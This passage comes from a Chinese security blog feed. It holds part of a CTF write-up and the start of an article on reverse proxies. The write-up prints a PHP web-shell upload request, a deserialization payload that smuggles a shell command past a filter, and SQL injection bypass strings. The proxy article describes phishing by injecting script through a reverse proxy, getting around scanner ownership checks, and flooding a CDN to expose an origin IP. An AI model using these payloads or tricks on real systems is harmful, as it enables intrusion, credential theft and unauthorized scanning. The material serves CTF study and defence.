class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20782431812432</span><br><span class="line">Content-Length: 717</span><br><span class="line">Referer: http://ctf/file_upload/shanghai/upload.html</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------20782431812432</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[1]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">-----------------------------20782431812432</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[0]&quot;</span><br><span class="line"></span><br><span class="line">x/../1.php/.</span><br><span class="line">-----------------------------20782431812432</span><br><span class="line">Content-Disposition: form-data; name=&quot;hehe&quot;</span><br><span class="line"></span><br><span class="line">1.php</span><br><span class="line">-----------------------------20782431812432</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">@&lt;?php $file = &apos;1ndex.php&apos;;$code = &apos;&lt;?php eval($_POST[\&apos;passer6y\&apos;]);?&gt;&apos;;file_put_contents($file,$code);?&gt;</span><br><span class="line">-----------------------------20782431812432</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">-----------------------------20782431812432--</span><br></pre></td></tr></table></figure></p><p>这样就可以拿到shell了。</p><p>sn00py师傅最初的非预期解法，就是因为想到，hehe变量不能包含自己传上去的文件，所以开多个爆破程序，让A程序和B程序相互产生的随机数相互碰撞，直到包含成功。</p><ol start="3"><li>web3<br>题目：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    class come&#123;    </span><br><span class="line">        private $method;</span><br><span class="line">        private $args;</span><br><span class="line">        function __construct($method, $args) &#123;</span><br><span class="line">            $this-&gt;method = $method;</span><br><span class="line">            $this-&gt;args = $args;</span><br><span class="line">        &#125;</span><br><span class="line">        function __wakeup()&#123;</span><br><span class="line">            foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">                $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function waf($str)&#123;</span><br><span class="line">            $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line">            $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line">            return $str;</span><br><span class="line">        &#125;           </span><br><span class="line">        function echo($host)&#123;      </span><br><span class="line">            system(&quot;echo $host&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123;</span><br><span class="line">                call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $first=&apos;hi&apos;;</span><br><span class="line">    $var=&apos;var&apos;;</span><br><span class="line">    $bbb=&apos;bbb&apos;;</span><br><span class="line">    $ccc=&apos;ccc&apos;;</span><br><span class="line">    $i=1;</span><br><span class="line">    foreach($_GET as $key =&gt; $value) &#123;</span><br><span class="line">            if($i===1)</span><br><span class="line">            &#123;</span><br><span class="line">                $i++;   </span><br><span class="line">                $$key = $value;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;break;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($first===&quot;doller&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        @parse_str($_GET[&apos;a&apos;]);     // 注册变量</span><br><span class="line">        </span><br><span class="line">        if($var===&quot;give&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            if($bbb===&quot;me&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                if($ccc===&quot;flag&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;;</span><br><span class="line">                    $come=@$_POST[&apos;come&apos;];</span><br><span class="line">                    unserialize($come); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;NO&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Can you hack me?&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><p>这题先考察变量覆盖，再考察反序列化漏洞。<br>37行处$i变量覆盖一直想多循环几次多覆盖几个变量，结果发现传入的i=1的类型是字符型，而if判断的是<code>===</code>。<br>所以这里就只能先覆盖$first变量进入，<strong>parse_str部分</strong>,这里可以继续覆盖变量，<a href="http://php.net/manual/zh/function.parse-str.php" target="_blank" rel="noopener">文档</a>,所以可以构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?first=doller&amp;a%3dvar%3dgive%26bbb%3dme%26ccc%3dflag</span><br><span class="line">// 解码后：?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag</span><br></pre></td></tr></table></figure></p><p>下面就考察反序列化的东西了，构造函数传入参数，析构函数回调echo函数。需要绕过waf函数。<br>&amp;拼接命令，${IFS}绕过空格，fl””ag绕过flag的限制。</p><p><img src="http://static.zybuluo.com/Passer6y/x2ljvm57ffcn03wkfbbhq28w/image_1crm340bpvfi15d819q31833s7s19.png" alt="image_1crm340bpvfi15d819q31833s7s19.png-9.9kB"></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">class come&#123;    </span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));             // 注册变量，过滤值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;           </span><br><span class="line">    function echo($host)&#123;</span><br><span class="line">        echo &quot;\n&quot;;      </span><br><span class="line">        system(&quot;echo $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$args = array(&apos;1&amp;cat$&#123;IFS&#125;fl&quot;&quot;ag&apos;);</span><br><span class="line">$aa = new come(&quot;echo&quot;,$args);</span><br><span class="line">echo urlencode(serialize($aa));</span><br></pre></td></tr></table></figure></p><p>本地测试：<br><img src="http://static.zybuluo.com/Passer6y/y8v1nx4robkju8dulum4yy7b/image_1crm35qnc10sc1lcjoe71rlhlr22m.png" alt="image_1crm35qnc10sc1lcjoe71rlhlr22m.png-73.6kB"></p><ol start="4"><li>web4<br>一个后台登录页，还有一个注入点。</li></ol><p>if sleep # 没被过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+and+if((SELECT+VERSION())&gt;1,sleep(3),0)%23</span><br></pre></td></tr></table></figure></p><p>mid 也没被过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+and+if(mid((SELECT+VERSION()),1,1)+&gt;1,sleep(3),0)%23</span><br></pre></td></tr></table></figure></p><p>测下面这条语句被拦了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+and+if(mid((SELECT+schema_name+from+information_schema.SCHEMATA+limit+1,1),1,1)+&gt;1,sleep(3),0)%23</span><br></pre></td></tr></table></figure></p><p>下面这个证明拦截了关键字<code>information_schema.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+and+if(mid((SELECT+schema_name+from+SCHEMATA+limit+1,1),1,1)+&lt;1,sleep(3),0)%23&amp;Submit=Select+Guest</span><br></pre></td></tr></table></figure></p><p>可以用<code>information . tables</code>绕过，然后提示str_replace为空，所以需要双写，这里需要fuzz一下过滤的东西。然后双写select和from即可绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+and+if+((ascii(mid((seselectlect+table_name+frofromm+information_schema+.+tables+limit+1),1,1))&gt;1),sleep(3),0)%23</span><br></pre></td></tr></table></figure></p><p>这里还有一个显注的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=sd&apos; unifromon selselectect (seselectlect group_concat(username,&apos;:&apos;,password)frfromom web.user),2#:</span><br></pre></td></tr></table></figure></p><blockquote><p><a href="https://xz.aliyun.com/t/3153#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3153#toc-3</a></p></blockquote><p>接下来就是一个<strong>文件上传</strong><br><img src="http://static.zybuluo.com/Passer6y/dnew3s0p4brzpxp5346d1euf/image_1crhijg1o78isca1kto1blqahb9.png" alt="image_1crhijg1o78isca1kto1blqahb9.png-96.1kB"><br>这里得想办法截断txt,或许是nginx解析漏洞？</p><p>sn00py师傅教我fuzz，0x00-&gt;0xff 然后尝试截断后面的txt，先用脚本生成一下字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in range(0,256):</span><br><span class="line">    i = bytes(chr(i), &apos;utf8&apos;)</span><br><span class="line">    with open(&quot;dic.txt&quot;, &quot;ab+&quot;) as f:</span><br><span class="line">        f.write(i)</span><br><span class="line">        f.write(bytes(&apos;\n&apos;, &apos;utf-8&apos;))</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/02r8d73xr5serxwfjhnu3mi6/image_1crhk7625t337hc7nd813qcb26.png" alt="image_1crhk7625t337hc7nd813qcb26.png-113.7kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>浅析反向代理</title>
    <link href="http://passer6y.fun/2018/07/05/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>http://passer6y.fun/2018/07/05/浅析反向代理/</id>
    <published>2018-07-05T15:00:00.000Z</published>
    <updated>2019-02-09T11:09:01.504Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://p4.ssl.qhimg.com/t01cb5a2af8acb7cd4d.jpg" alt=""></p><blockquote><p>最近这段时间频频接触到反代的东西，所以就更进一步的了解了一番, 有什么不对的地方还请大佬们指正~<br>本文需要用到的代码已上传<a href="https://github.com/Passer6y/Reverse_proxy" target="_blank" rel="noopener">Github</a><br><strong>本文由<a href="https://www.anquanke.com/post/id/150436" target="_blank" rel="noopener">安全客</a>原创发布</strong><br><a id="more"></a></p></blockquote><p><strong>本文涉及到的东西仅供技术研究，请勿用于非法用途，否则后果自负</strong></p><h1 id="浅析反向代理"><a href="#浅析反向代理" class="headerlink" title="浅析反向代理"></a>浅析反向代理</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01: 前言"></a>0x01: 前言</h2><p>最近把博客重新弄了一下，发现了一个特别有意思的东西，看图~<br><img src="https://i.loli.net/2018/07/02/5b3a009246944.png" alt="Alt text"></p><p>还有一些有意思的东西，比如反代谷歌(谷歌镜像站)、钓鱼、绕过国内备案和线下CTF中的一些骚操作，等等。</p><h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02: 简介"></a>0x02: 简介</h2><p>反向代理，简而言之就是反向代理服务器从目标内容服务器上抓取内容返回给用户，反向代理服务器充当一个中介功能，他本身是没有任何内容的。区别于正向代理而言，反向代理是代理的服务端，而正向代理是代理的客户端。<br> <img src="https://i.loli.net/2018/07/02/5b3a00ad80dcc.png" alt="Alt text"></p><p>再来简单介绍一下我在前言中所说的我让我的博客ip是如何变成1.1.1.1的，其实1.1.1.1是一台DNS服务器(号称全球最快的DNS)，正好1.1.1.1又是cf cdn中的一个节点。这样我们就可以将域名解析到1.1.1.1，然后在cf中设置好真实的回源地址即可。在文末已附上教程链接，感兴趣的可以玩玩~</p><h2 id="0x03-一些有意思的东西"><a href="#0x03-一些有意思的东西" class="headerlink" title="0x03: 一些有意思的东西"></a>0x03: 一些有意思的东西</h2><p>除了上述所说的套一个CDN，让自己ip变成1.1.1.1来隐藏自己站点ip，还有一些其他好玩的~</p><ol><li>CTF线下中的一些思路<br>因为我们线下赛中每支队伍的web站点都一样，笔者在之前的一次线下训练赛的时候尝试过修改apache配置文件来反代分数最高的队伍的站点，从而达到流量转发(伤害转移)的效果。这个具体能不能实现得看服务器的权限能提升到多高，其次也得根据具体的check机制来灵活使用。如果提升的权限不够高的话，也可以配置.htaccess来实现反代。用tcpdump倒流量顺手抓一波别人的payload。<br>如果我们采用的是.htaccess方法进行反向代理，这里说一下这种方法的原理和其他的不同在于它本质上是利用.htaccess映射到一个php文件，然后利用php文件去抓取目标服务器的信息返回给客户端。这里.htaccess配置的作用是重写url。所以我们不妨在这个php文件中包含一下这个demo1.php即可达到payload的记录的效果：</li></ol><p>代码如下：<br>demo1.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">write_log();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_http_raw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $raw = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    $raw .= $_SERVER[<span class="string">'REQUEST_METHOD'</span>].<span class="string">' '</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>].<span class="string">' '</span>.$_SERVER[<span class="string">'SERVER_PROTOCOL'</span>].<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">            $key = substr($key, <span class="number">5</span>);</span><br><span class="line">            $key = str_replace(<span class="string">'_'</span>, <span class="string">'-'</span>, $key);</span><br><span class="line">            $raw .= $key.<span class="string">': '</span>.$value.<span class="string">"\r\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $raw .= <span class="string">"\r\n"</span>;</span><br><span class="line">    $raw .= file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    <span class="keyword">return</span> $raw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_log</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = date(<span class="string">"Y/m/d H:i:s"</span>).<span class="string">"\r\n"</span>.get_http_raw().<span class="string">"\r\n\r\n"</span>;</span><br><span class="line">    $file = fopen(<span class="string">'log1.txt'</span>, <span class="string">'a'</span>); <span class="comment">//日志路径</span></span><br><span class="line">    fwrite($file, $data);</span><br><span class="line">    fclose($file);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>记录如下:<br><img src="https://i.loli.net/2018/07/02/5b3a00e2a7a3a.png" alt="Alt text"></p><ol start="2"><li>克隆网站 –中间人攻击<br>我们可以安装一个nginx的第三方模块ngx_http_substitutions_filter_module,然后nginx的配置文件中加入一段，即可弹窗等。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subs_filter &lt;/head&gt; &quot;&lt;script&gt;alert(&apos;1&apos;);&lt;/script&gt;&lt;/head&gt;&quot;;</span><br></pre></td></tr></table></figure><p>location部分的配置如下：<br><img src="https://i.loli.net/2018/07/02/5b3a00fcdacf6.png" alt="Alt text"></p><p>这里有个坑弄了我好久… 就是我们请求网站的时候，数据包头部一般会有Accept-Encoding部分，如下图所示，这个部分告诉服务器，客户端能以怎样的形式解码。那么问题来了，数据包是压缩的，我们怎样才能用subs_filter 替换其中的内容呢？ 其实正像上面截图的配置那样设置：反代服务器请求上游服务器的时候带上Accept-Encoding=‘ ’ 即可，表示不接受任何压缩数据。</p><p><img src="https://i.loli.net/2018/07/02/5b3a011fb3e7a.png" alt="Alt text"></p><p>访问<a href="http://a.cuit.store,效果如下：" target="_blank" rel="noopener">http://a.cuit.store,效果如下：</a><br><img src="https://i.loli.net/2018/07/02/5b3a01347ddc1.png" alt="Alt text"></p><p>这样如果我们反代一个登录页面，比如qq空间，然后植入我们的js脚本，后果emmm…<br>当然了，不同站的反代难度是不一样的~</p><ol start="3"><li>绕过网站所有权验证，调用在线的云扫描器给我们需要渗透的网站进行扫描<br>以人人扫这个云扫描平台为例：<a href="http://www.renrenscan.com/，" target="_blank" rel="noopener">http://www.renrenscan.com/，</a> 其中需要我们把一个认证文件放到网站根目录上，我们可以设置反代规则的时候，对这个文件进行排除，不进行代理即可绕过，或者直接用.htaccess的方法进行反代就行。<br><img src="https://i.loli.net/2018/07/02/5b3a01616cf05.png" alt="Alt text"><br>这样我们只需要等待扫描结果，即可get目标站的漏洞了~</li></ol><p>如果我们再邪恶一点….顺便也可以包含上demo1.php，把这些扫描的payload都导出来下来(手动滑稽)</p><p> ps：这里说点其他的，我发现在给我博客加cdn的时候，发现了如下图所示的这个，因为我用的是cloudflare免费版的套餐，可以看到有很多请求没有经过CDN处理就直接回源了，这就可以让我们想到如果我们渗透的站点是套了CDN的，常规的找邮件服务器，静态文件，ssrf啥的如果都不管用，还不如来点简单粗暴的，暴力发包让CDN承受不住而回源，这样真实ip’轻松’get~</p><p><img src="https://i.loli.net/2018/07/02/5b3a01781e415.png" alt="Alt text"></p><h2 id="0x04-反向代理不当"><a href="#0x04-反向代理不当" class="headerlink" title="0x04: 反向代理不当"></a>0x04: 反向代理不当</h2><p>一般当我们遇到了反代服务器的时候，可以试着用burpsuite的repeat功能，设置host为反代服务器，然后把http请求中的路径改为内网中的host(一般需要穷举，穷举网段ip端口域名等等)。因为反向代理的本质就是将客户端的请求url重写后发往上游服务器，将返回结果发回客户端，在这之中，如果对路径的配置不当就有可能导致反向代理变正向代理导致一些信息泄露，内网穿透等等漏洞。<br><img src="https://i.loli.net/2018/07/02/5b3a0196ef547.png" alt="Alt text"></p><p>参考：<br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191121.html" target="_blank" rel="noopener">陌陌web服务器Path处理不当可以正向代理</a><br><a href="https://bbs.ichunqiu.com/thread-36628-1-1.html" target="_blank" rel="noopener">内网穿透代理洞</a><br><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651064742&amp;idx=4&amp;sn=acab07b6df1b307c5ef27b70e3e74e69&amp;chksm=bd1f9b2d8a68123b6064cc4fbbfa7388508d8763a976a18cb8deacb72680f5db7d894a614b91&amp;mpshare=1&amp;scene=23&amp;srcid=0123MGZlcIvsLgWBmyZ5h4rZ#rd" target="_blank" rel="noopener">谷歌内部主机信息泄露漏洞</a><br><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2015-0131169" target="_blank" rel="noopener">新浪HTTP代理配置不当漫游内网</a><br><a href="https://paper.tuisec.win/detail/b6d9381e54b0778" target="_blank" rel="noopener">挖洞经验之代理不当日进内网</a>  </p><p>还有一种就是nginx为Django做反代的时候，<a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html#_1" target="_blank" rel="noopener">静态文件配置错误导致源码泄露</a></p><p>##0x05: 如何防止被反向代理<br>反向代理不仅会对用户造成威胁，而且对服务器来说也会增强负载，还有就是通过代理的方式盗取网站数据，还有就是seo相关的影响了等等…</p><ol><li>通过js防止反代：如果地址栏的网址不是<a href="http://www.passer6y.fun那么就进行跳转。" target="_blank" rel="noopener">www.passer6y.fun那么就进行跳转。</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">if (document.domain !=&apos;www.passer6y.fun&apos;)&#123;</span><br><span class="line">    window.location.href=&apos;http://www.passer6y.fun/&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><p>其实这种方法还是可以绕过的，nginx有扩展模块可以将指定的字符进行替换，这时我们只需将target域名替换成我们自己的就行了(上文有说到如何替换)。或者直接不代理这个js文件也行。</p><ol start="2"><li><p>php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if($_SERVER[&apos;SERVER_NAME&apos;] != &apos;www.passer6y.fun&apos; )   </span><br><span class="line">&#123;  </span><br><span class="line">header(&apos;Location: http://www.passer6y.fun/&apos;);</span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>.htaccess</p></li></ol><p>.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">    RewriteBase /</span><br><span class="line">    php_value auto_append_file proxy.php</span><br></pre></td></tr></table></figure></p><p> proxy.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $f = getenv(“HTTP_X_FORWARDED_FOR”);</span><br><span class="line">        $server = getenv(“HTTP_HOST”);</span><br><span class="line">        if (($f!=””)&amp;&amp;($server!=”www.passer6y.fun”)&#123;</span><br><span class="line">            echo ‘本服务器禁止恶意反向代理！’;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x06-Apache-反代配置方法"><a href="#0x06-Apache-反代配置方法" class="headerlink" title="0x06: Apache 反代配置方法"></a>0x06: Apache 反代配置方法</h2><h3 id="1-windows下："><a href="#1-windows下：" class="headerlink" title="1. windows下："></a>1. windows下：</h3><p>修改配置文件：Apache\conf\httpd.conf，将以下两个前面的注释符去掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">#LoadModule proxy_http_module modules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p><p>然后新增一个Apache\conf\vhosts.conf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">        ServerAdmin admin   # 域名信息</span><br><span class="line"></span><br><span class="line">        ServerName passer6y.cn # 邮件信息</span><br><span class="line"></span><br><span class="line">        ProxyRequests Off  </span><br><span class="line"></span><br><span class="line">        &lt;Proxy *&gt;</span><br><span class="line"></span><br><span class="line">        Order deny,allow</span><br><span class="line"></span><br><span class="line">        Allow from all</span><br><span class="line"></span><br><span class="line">        &lt;/Proxy&gt;</span><br><span class="line"></span><br><span class="line">        ProxyPass / http://passer6y.cn/ # 将一个远端服务器映射到本地服务器的URL空间</span><br><span class="line"></span><br><span class="line">        ProxyPassReverse / http://passer6y.cn/ # 调整由反向代理服务器发送的HTTP回应头中的URL。</span><br><span class="line"></span><br><span class="line">    &lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p><h3 id="2-linux下"><a href="#2-linux下" class="headerlink" title="2. linux下"></a>2. linux下</h3><blockquote><p>参考：<a href="https://www.leaseweb.com/labs/2014/12/tutorial-apache-2-4-transparent-reverse-proxy/" target="_blank" rel="noopener">https://www.leaseweb.com/labs/2014/12/tutorial-apache-2-4-transparent-reverse-proxy/</a><br>测试环境：Ubuntu 16.04，apache2<br>加载”proxy_http”模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod 